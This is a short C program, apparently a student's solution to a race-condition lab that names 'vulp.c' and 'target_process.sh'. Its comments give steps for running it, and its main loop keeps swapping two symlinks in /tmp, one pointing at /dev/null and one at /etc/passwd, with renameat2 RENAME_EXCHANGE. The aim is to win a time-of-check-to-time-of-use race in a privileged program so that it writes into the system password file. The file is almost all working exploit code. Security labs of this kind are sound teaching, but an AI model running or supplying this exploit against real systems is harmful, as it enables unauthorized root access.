// for my execution:
//  in 'vulp.c', i put 'sleep(5)', if dont work, you can modify it
// wait a several seconds in 'target_process.sh'
// delete a XYZ and ABC before to started
// first execute 'target_process.sh', next this program, 'exploit-improved.c'


#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <linux/fs.h>
#include <stdio.h>

int main()
{
	unsigned int flags = RENAME_EXCHANGE;
	while(1)
	{
		unlink("/tmp/XYZ");
		symlink("/dev/null", "/tmp/XYZ");
		unlink("/tmp/ABC");
		symlink("/etc/passwd", "/tmp/ABC");
		syscall(SYS_renameat2, 0, "/tmp/XYZ",0, "/tmp/ABC", flags);

	}
}
